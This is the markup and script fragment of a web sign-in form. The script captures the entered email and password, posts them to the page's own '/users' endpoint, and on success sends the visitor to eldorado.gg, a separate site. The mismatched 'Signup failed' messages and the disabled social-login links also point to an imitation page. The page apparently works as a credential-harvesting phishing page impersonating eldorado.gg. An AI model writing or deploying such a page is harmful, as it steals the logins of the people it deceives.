    <div style="text-align:center;padding:12px;background:#fff2f2;color:#700;max-width:700px;margin:16px auto;border-radius:6px;">
      This site uses JavaScript for the AJAX sign-in experience. If JavaScript is disabled the form will submit normally to the server.

  </noscript>

  <script nonce="1fa13b4ca2edff5af1de0e8058c697193590362de1e9f4ae26665e650c792190">
    document.addEventListener("DOMContentLoaded", function () {
      var form = document.getElementById("primary-form");
      if (!form) return;

      // Make social links show a helpful error
      var socialLinks = document.querySelectorAll('a[data-social-login="true"]');
      socialLinks.forEach(function (a) {
        a.addEventListener("click", function (e) {
          e.preventDefault();
          var error = document.getElementById("login-error");
          if (error) {
            error.textContent = "Social login is not configured yet.";
            error.style.display = "block";
          }
        });
      });

      form.addEventListener("submit", async function (e) {
        e.preventDefault();
        var emailInput = form.querySelector('input[name="email"]');
        var passwordInput = form.querySelector('input[name="password"]');
        var error = document.getElementById("login-error");
        var submitButton = form.querySelector('button[type="submit"]');

        var email = emailInput ? emailInput.value.trim() : "";
        var password = passwordInput ? passwordInput.value : "";

        if (!email || !password) {
          if (error) {
            error.textContent = "Email and password are required.";
            error.style.display = "block";
          }
          return;
        }

        if (error) error.style.display = "none";
        if (submitButton) submitButton.disabled = true;

        try {
          var res = await fetch("/users", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            credentials: "include",
            body: JSON.stringify({ email: email, password: password })
          });

          if (!res.ok) {
            try {
              var j = await res.json();
              throw new Error(j && j.message ? j.message : "Signup failed");
            } catch (err) {
              throw new Error("Signup failed");
            }
          }

          // on success redirect to eldorado.gg
          window.location.href = "https://www.eldorado.gg/";
        } catch (err) {
          if (error) {
            error.textContent = err.message || "Signup failed. Please check your credentials and try again.";
            error.style.display = "block";
          }
        } finally {
          if (submitButton) submitButton.disabled = false;
        }
      });
    });
  </script>
